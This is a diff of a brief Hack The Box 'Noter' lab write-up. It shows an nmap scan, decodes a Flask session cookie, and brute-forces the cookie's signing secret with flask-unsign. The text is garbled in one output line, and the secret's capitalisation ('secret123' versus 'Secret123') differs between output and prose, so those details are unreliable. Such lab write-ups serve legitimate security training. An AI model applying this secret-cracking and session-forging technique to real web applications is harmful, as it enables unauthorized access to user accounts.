@@ -1,8 +1,8 @@
-Noter HTB  
-level Medium
+Hack The Box noter
 
 Nmap scan  
 
+```
 # Nmap 7.92 scan initiated Mon May  9 10:22:59 2022 as: nmap -sCV -o nmap 10.129.59.70
 Nmap scan report for 10.129.59.70
 Host is up (0.17s latency).
@@ -21,6 +21,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Mon May  9 10:23:32 2022 -- 1 IP address (1 host up) scanned in 33.19 seconds
+````
 
 The scan reveal 3 open port classic ssh on 22, 21 on ftp and 5000 http
 ftp is not  allowed to anonymous login
@@ -39,17 +40,18 @@ Check the cookie it use the flask session cookies to manage the sessions
 
 encoded cookie
 
+```
 eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidXNlciJ9.YnjkQg.qfVnrJ8yVPJ0J_HLEnsrY6IJXMc
-
+```
 decoded cookie
-
+```
 {'logged_in': True, 'username': 'user'}
-
+```
 Normaly the flask session cookies are signed with a secret. We need to identify the secert to modify
 the cookie
 
 Bruteforce the secret with tool called flask-sign
-
+```bash
 flask-unsign --unsign --cookie < cookie.txt 
 [*] Session decodes to: {'logged_in': True, 'username': 'user'}
 [*] No wordlist selected, falling back to default wordlist..
@@ -57,8 +59,5 @@ flask-unsign --unsign --cookie < cookie.txt
 [*] Attempted (1792): -----BEGIN PRIVATE KEY-----***
 [+] Found secret key after 17024 attemptsdsInfoexampl
 'secret123'
-
-Found the secret "Secret123"
-
-
-
+````
+Found the secret **"Secret123"**
